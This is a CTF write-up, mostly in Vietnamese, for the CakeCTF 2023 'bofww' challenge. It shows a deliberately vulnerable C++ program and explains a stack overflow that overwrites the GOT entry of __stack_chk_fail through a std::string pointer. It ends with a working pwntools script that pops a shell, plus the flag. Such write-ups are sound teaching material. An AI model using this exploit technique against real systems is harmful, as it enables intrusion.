# bofww

## source C++

```c 
#include <iostream>

void win() {
  std::system("/bin/sh");
}

void input_person(int& age, std::string& name) {
  int _age;
  char _name[0x100];
  std::cout << "What is your first name? ";
  std::cin >> _name;
  std::cout << "How old are you? ";
  std::cin >> _age;
  name = _name;
  age = _age;
}

int main() {
  int age;
  std::string name;
  input_person(age, name);
  std::cout << "Information:" << std::endl
            << "Age: " << age << std::endl
            << "Name: " << name << std::endl;
  return 0;
}

__attribute__((constructor))
void setup(void) {
  std::setbuf(stdin, NULL);
  std::setbuf(stdout, NULL);
}
```

## Analysis
- khá bất ngờ khi lần đầu làm 1 chall bằng c++
- ở đây ko có read, fgets, gets mà thay vào đó cin
- tại hàm name có lỗi BOF khi cin vào _name[0x100], có cả hàm win nữa nên ta nghĩ ngay đến ret2win
- checks thì có canary , mà ta ko thể leak được nên ret2win là ko khả thi 
- sau khi được hint thì ta phải sử dụng 1 kĩ thuật mới đó **overwrite got __stack_chk_fail** 

### __stack_chk_fail 

https://github.com/gookoosss/CTF/blob/main/PWN/training/__stack_chk_fail.md

## Exploit 
- hướng đi của ta là **overwrite got __stack_chk_fail**, nhưng làm sao để làm được nó??
- đọc lại source thì thấy có thêm bug ở đây 
``` 
  name = _name;
  age = _age;
```
- ở đây string& name đang là 1 pointer trỏ đến data thằng name, ta debug thử xem sao 

![image](https://github.com/gookoosss/CTF/assets/128712571/062313ee-1452-42f5-b7ce-9df0c928abe0)

![image](https://github.com/gookoosss/CTF/assets/128712571/efd3871a-a129-40ec-9ae2-44b9b3181e62)


- deee đúng như ta đoán r, thế giờ ý tưởng của ta là sử dụng BOF để orw **thằng pointer (0x7fffffffe030)** thành got **stack_chk_fail**, còn sau đó data sẽ được gán vào __stack_chk_fail nên ta sẽ nhập luôn hàm win vào data 
- age ko quan trọng nên ta nhập đại số nào đó  

![image](https://github.com/gookoosss/CTF/assets/128712571/4b781a7e-5f3e-49b2-8378-d50d673e32ff)


- dee và cuối cùng ta cũng lấy được flag

![image](https://github.com/gookoosss/CTF/assets/128712571/300e3ea3-5d90-4399-bdd4-c8334434e16b)


## script 

```python 
from pwn import *
p = remote("bofww.2023.cakectf.com", 9002)
# p = process('./bofww')

# gdb.attach(p, gdbscript = '''
# b*0x0000000000401369
# b*0x000000000040136e
# b*0x00000000004013b4
# c
# ''')

# input()


payload = p64(0x4012f6)
payload += p64(0x404050)*0x30

p.sendlineafter(b"name? ", payload)
p.sendline(b'4444')


p.interactive()

# CakeCTF{n0w_try_w1th0ut_w1n_func710n:)}
``` 

## Flag 

CakeCTF{n0w_try_w1th0ut_w1n_func710n:)}
